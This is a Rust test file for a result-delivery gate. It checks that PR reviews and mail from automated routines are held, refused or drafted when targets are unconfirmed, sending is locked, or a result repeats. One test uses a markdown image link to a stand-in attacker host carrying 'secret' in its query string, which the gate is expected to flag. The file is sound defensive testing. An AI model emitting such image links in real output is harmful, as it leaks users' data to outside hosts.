//! The gate over the real store: show-only and trial write nothing, an
//! unconfirmed target refuses and pauses, caps hold a result as a draft,
//! automatic sending stays locked, a second result to one place is held
//! (D55), and a held result is taken back.

use std::sync::Arc;

use eos_contracts::{ActionClass, Freedom, Part, Recipient, ResultDoc};
use eos_core::Clock;
use eos_core::delivery::{ChannelTraits, Idempotency, Undo};
use eos_core::routine::{GateDecision, GateInput, GateMode, RoutineControl, RunGate, RunOutcomes};
use eos_domain::routine::numbers::Outcome;
use eos_domain::run_scope::Trust;
use eos_inbox::gate::Gate;
use eos_testkit::{ControlCall, FakeChannels, OutcomeCall, TempStore};
use serde_json::{Value, json};

use crate::rig::{Rig, pull_requests};

pub(crate) fn review_traits(class: ActionClass) -> ChannelTraits {
    ChannelTraits { class, idempotency: Idempotency::Marker, undo: Undo::Partial, undo_window_ms: 0, max_bytes: 65_536 }
}

pub(crate) struct Gated {
    pub(crate) rig: Rig,
    pub(crate) gate: Arc<Gate>,
    pub(crate) channels: FakeChannels,
    _control: Arc<dyn RoutineControl>,
}

impl Gated {
    pub(crate) fn new() -> Self {
        let channels = FakeChannels::new().with("github", review_traits(ActionClass::Speak));
        let rig = Rig::with_channels(TempStore::new(), channels.clone(), pull_requests());
        let gate = Arc::new(Gate::new(Arc::new(channels.clone()), rig.zone.clone(), rig.clock.clone()));
        let control: Arc<dyn RoutineControl> = rig.control.clone();
        let outcomes: Arc<dyn RunOutcomes> = rig.outcomes.clone();
        gate.attach(&control, &outcomes);
        rig.temp.exec(
            "INSERT INTO runs (id, routine_id, kind, origin, input, state, priority, device, cost_usd, headline, \
             created_at, updated_at) VALUES ('rn-1', 'rt-1', 'standing', 'hand', '{}', 'checking', 0, 'mac-1', 0.42, \
             'Two comments on #482', 1, 1)",
        );
        Self { rig, gate, channels, _control: control }
    }

    pub(crate) async fn apply(&self, input: GateInput) -> GateDecision {
        let (gate, ids, now) = (self.gate.clone(), self.rig.ids.clone(), self.rig.clock.now_ms());
        self.rig
            .temp
            .port()
            .write(move |tx, out| gate.apply_in(tx, out, now, ids.as_ref(), &input))
            .await
            .expect("the gate decides")
    }

    pub(crate) fn rows(&self) -> i64 {
        self.rig.temp.count("SELECT COUNT(*) FROM inbox_deliveries")
    }

    pub(crate) fn items(&self) -> i64 {
        self.rig.temp.count("SELECT COUNT(*) FROM inbox_items")
    }
}

pub(crate) fn pull_request() -> Recipient {
    serde_json::from_value(json!({"id": "pr", "kind": "item_place", "channel": "github",
                                  "bound": {"fact": "repo", "in": ["acme/game"]}}))
    .expect("a recipient")
}

fn freedom(rung: &str) -> Freedom {
    serde_json::from_value(json!({"rung": rung})).expect("a freedom")
}

pub(crate) fn review(text: &str) -> ResultDoc {
    let part = |key: &str, role: &str, text: &str| Part {
        key: key.into(),
        role: role.into(),
        text: text.into(),
        meta: Default::default(),
    };
    ResultDoc {
        kind: "github.review".into(),
        channel: "github".into(),
        action: "post_review".into(),
        parts: vec![part("event", "event", "COMMENT"), part("summary", "summary", text)],
    }
}

/// A PR Review result for the pull request `acme/game#482`, at `rung`. As a
/// source writes them, the item names no repository; the signal's facts do.
pub(crate) fn input(rung: &str) -> GateInput {
    GateInput {
        run_id: "rn-1".into(),
        routine_id: "rt-1".into(),
        version: "rv-1".into(),
        origin: "hand".into(),
        result_mode: GateMode::AsUsual,
        doc: review("Looks good."),
        targets: vec![pull_request()],
        item_facts: json!({"kind": "github.pull_request", "key": "github:pr:acme/game#482@abc", "untrusted": true}),
        signal_facts: [("repo".to_owned(), eos_contracts::Fact::Text("acme/game".into()))].into_iter().collect(),
        subject_key: Some("github:pr:acme/game#482".into()),
        trust: Trust::Untrusted,
        freedom_confirmed: Some(freedom(rung)),
        goes_to_confirmed: vec![pull_request()],
    }
}

fn held(decision: &GateDecision) -> String {
    match decision {
        GateDecision::Held { item_id } => item_id.clone(),
        other => panic!("not held: {other:?}"),
    }
}

#[tokio::test]
async fn show_only_and_trial_results_write_no_row() {
    let gated = Gated::new();
    for mode in [GateMode::ShowOnly, GateMode::Trial] {
        let decision = gated.apply(GateInput { result_mode: mode, ..input("on_its_own") }).await;
        assert_eq!(decision, GateDecision::Shown);
    }
    assert_eq!((gated.rows(), gated.items()), (0, 0));
    assert!(gated.channels.sent().is_empty());
}

#[tokio::test]
async fn a_target_outside_the_confirmed_goes_to_refuses_alerts_and_pauses() {
    let gated = Gated::new();
    let decision = gated.apply(GateInput { goes_to_confirmed: Vec::new(), ..input("on_its_own") }).await;
    assert_eq!(decision, GateDecision::Refused);
    assert_eq!(gated.rows(), 0);
    let paused = ControlCall::Pause { routine_id: "rt-1".into(), reason: "target_refused".into() };
    assert_eq!(gated.rig.control.calls(), [paused]);
    let alerts = gated.rig.temp.count("SELECT COUNT(*) FROM inbox_items WHERE kind = 'routine_alert'");
    assert_eq!(alerts, 1);
}

#[tokio::test]
async fn a_run_an_agent_started_is_capped_at_draft() {
    let gated = Gated::new();
    let decision = gated.apply(GateInput { origin: "agent".into(), ..input("on_its_own") }).await;
    held(&decision);
    assert_eq!(gated.rows(), 0);
}

#[tokio::test]
async fn a_flagged_result_is_held_with_its_flags() {
    let gated = Gated::new();
    let doc = review("See ![x](https://evil.io/pixel.png?d=secret).");
    let item_id = held(&gated.apply(GateInput { doc, ..input("on_its_own") }).await);
    let item = gated.rig.find(&item_id).await;
    let payload: Value = serde_json::from_str(&item.payload).expect("json");
    assert_eq!(payload["flags"], json!(["new_host", "image"]));
    assert_eq!(gated.rows(), 0);
}

#[tokio::test]
async fn at_draft_the_result_is_held_as_a_draft_item_with_its_cost_and_verdict() {
    let gated = Gated::new();
    gated.rig.temp.exec(
        "INSERT INTO run_results (run_id, attempt, kind, headline, body, created_at, verdict) VALUES \
         ('rn-1', 1, 'github.review', 'h', '{}', 1, '{\"pass\":true}')",
    );
    let item_id = held(&gated.apply(input("draft")).await);
    let item = gated.rig.find(&item_id).await;
    assert_eq!((item.kind.as_str(), item.title.as_str()), ("draft", "Two comments on #482"));
    assert_eq!(item.subject_key.as_deref(), Some("github:pr:acme/game#482"));
    let payload: Value = serde_json::from_str(&item.payload).expect("json");
    assert_eq!(payload["doc"], serde_json::to_value(review("Looks good.")).expect("json"));
    assert_eq!((&payload["costUsd"], &payload["verdict"]), (&json!(0.42), &json!({"pass": true})));
    assert_eq!(gated.rows(), 0, "nothing is queued while it waits");
}

#[tokio::test]
async fn a_held_mail_names_each_recipient_readably() {
    let gated = Gated::new();
    let digest: Recipient = serde_json::from_value(json!({"id": "boss", "kind": "fixed", "channel": "mail",
                                                         "address": "boss@acme.dev"}))
    .expect("a recipient");
    let paragraph =
        Part { key: "p:1".into(), role: "paragraph".into(), text: "Hello.".into(), meta: Default::default() };
    let doc = ResultDoc { kind: "mail".into(), channel: "mail".into(), action: "send".into(), parts: vec![paragraph] };
    let mail = GateInput { doc, targets: vec![digest.clone()], goes_to_confirmed: vec![digest], ..input("draft") };
    let item = gated.rig.find(&held(&gated.apply(mail).await)).await;
    let payload: Value = serde_json::from_str(&item.payload).expect("json");
    let to = payload["doc"]["parts"].as_array().and_then(|parts| parts.iter().find(|p| p["key"] == "to:boss").cloned());
    assert_eq!(to.map(|part| part["text"].clone()), Some(json!("boss@acme.dev")));
}

#[tokio::test]
async fn while_automatic_sending_is_locked_a_routine_on_its_own_is_held_as_a_draft() {
    let gated = Gated::new();
    for rung in ["send_then_tell", "on_its_own"] {
        let item_id = held(&gated.apply(input(rung)).await);
        let item = gated.rig.find(&item_id).await;
        let payload: Value = serde_json::from_str(&item.payload).expect("json");
        assert_eq!((item.kind.as_str(), &payload["rung"]), ("draft", &json!("draft")), "{rung}");
    }
    assert_eq!(gated.rows(), 0, "nothing is queued");
    assert!(gated.channels.sent().is_empty());
}

#[tokio::test]
async fn an_item_of_a_repository_outside_the_bound_is_held_and_one_without_facts_too() {
    let gated = Gated::new();
    let other = [("repo".to_owned(), eos_contracts::Fact::Text("evil/game".into()))].into_iter().collect();
    held(&gated.apply(GateInput { signal_facts: other, ..input("on_its_own") }).await);
    held(&gated.apply(GateInput { signal_facts: Default::default(), ..input("on_its_own") }).await);
    assert_eq!(gated.rows(), 0);
}

#[tokio::test]
async fn a_held_draft_can_be_withdrawn() {
    let gated = Gated::new();
    let item_id = held(&gated.apply(input("draft")).await);
    let gate = gated.gate.clone();
    gated.rig.temp.port().write(move |tx, out| gate.withdraw_in(tx, out, "rn-1")).await.expect("withdraws");
    assert_eq!(gated.rig.find(&item_id).await.state.as_str(), "withdrawn");
}

#[tokio::test]
async fn while_eos_is_stopped_a_result_free_to_go_is_held() {
    let gated = Gated::new();
    gated.rig.temp.exec("INSERT INTO inbox_halt (id, \"on\", since, by, updated_at) VALUES (1, 1, 1, 'dashboard', 1)");
    held(&gated.apply(input("on_its_own")).await);
    assert_eq!(gated.rows(), 0);
}

#[tokio::test]
async fn a_newer_runs_draft_on_the_same_subject_ends_the_run_it_replaced() {
    let gated = Gated::new();
    let first = held(&gated.apply(input("draft")).await);
    gated.rig.temp.exec("UPDATE runs SET state = 'waiting_for_user' WHERE id = 'rn-1'");
    gated.rig.temp.exec(
        "INSERT INTO runs (id, routine_id, kind, origin, input, state, priority, device, created_at, updated_at) \
         VALUES ('rn-2', 'rt-1', 'standing', 'trigger', '{}', 'checking', 0, 'mac-1', 2, 2)",
    );
    let second = held(&gated.apply(GateInput { run_id: "rn-2".into(), ..input("draft") }).await);

    let old = gated.rig.find(&first).await;
    assert_eq!((old.state.as_str(), old.replaced_by.as_deref()), ("replaced", Some(second.as_str())));
    let ended = OutcomeCall::Finished { run_id: "rn-1".into(), outcome: Outcome::Replaced };
    assert_eq!(gated.rig.outcomes.calls(), [ended]);
    let rows = gated.rig.temp.count(&format!(
        "SELECT COUNT(*) FROM inbox_outcomes WHERE run_id = 'rn-1' AND outcome = 'replaced' AND item_id = '{first}'"
    ));
    assert_eq!(rows, 1);
}

/// Gives `run` the pull request `acme/game#<number>` at version `abc` as
/// its item, so its subject is `github:pr:acme/game#<number>`.
fn about(gated: &Gated, run: &str, number: u32) {
    gated.rig.temp.exec(&format!(
        "INSERT OR IGNORE INTO runs (id, routine_id, kind, origin, input, state, priority, device, created_at, \
         updated_at) VALUES ('{run}', 'rt-1', 'standing', 'hand', '{{}}', 'checking', 0, 'mac-1', 2, 2)"
    ));
    gated.rig.temp.exec(&format!(
        "UPDATE runs SET item_key = 'github:pr:acme/game#{number}@abc', \
         input = '{{\"item\":{{\"version\":\"abc\"}}}}' WHERE id = '{run}'"
    ));
}

/// A send of `run` to the pull request recipient, in `state`.
fn delivered(gated: &Gated, id: &str, run: &str, state: &str) {
    gated.rig.temp.exec(&format!(
        "INSERT INTO inbox_deliveries (id, run_id, routine_id, channel, action, target_ref, target, body, body_hash, \
         class, mode, state, created_at, updated_at) VALUES ('{id}', '{run}', 'rt-1', 'github', 'post_review', 'pr', \
         '{{}}', '{{}}', 'h', 'speak', 'auto', '{state}', 1, 1)"
    ));
}

#[tokio::test]
async fn a_second_result_of_one_subject_to_one_recipient_is_held_while_the_first_went_or_waits() {
    let gated = Gated::new();
    about(&gated, "rn-1", 482);
    for (n, state) in ["queued", "holding", "sending", "uncertain", "sent"].into_iter().enumerate() {
        gated.rig.temp.exec("DELETE FROM inbox_deliveries");
        delivered(&gated, "dl-first", "rn-1", state);
        let run = format!("rn-repeat-{n}");
        about(&gated, &run, 482);
        let item_id = held(&gated.apply(GateInput { run_id: run.clone(), ..input("on_its_own") }).await);
        let item = gated.rig.find(&item_id).await;
        let payload: Value = serde_json::from_str(&item.payload).expect("json");
        assert_eq!(payload["rung"], json!("draft"), "{state}");
    }
    assert_eq!(gated.rows(), 1, "nothing more is queued");
}

#[tokio::test]
async fn a_send_that_never_reached_the_recipient_or_another_subject_is_no_repeat() {
    let gated = Gated::new();
    about(&gated, "rn-1", 482);
    for (n, state) in ["failed", "stopped", "undone"].into_iter().enumerate() {
        delivered(&gated, &format!("dl-{n}"), "rn-1", state);
    }
    about(&gated, "rn-2", 482);
    about(&gated, "rn-3", 483);
    delivered(&gated, "dl-other", "rn-3", "sent");
    let decision = gated.apply(GateInput { run_id: "rn-2".into(), ..input("on_its_own") }).await;
    if eos_domain::freedom::AUTOMATIC_RUNGS_LOCKED {
        held(&decision);
    } else {
        assert!(matches!(decision, GateDecision::Delivering { .. }), "goes out: {decision:?}");
    }
}
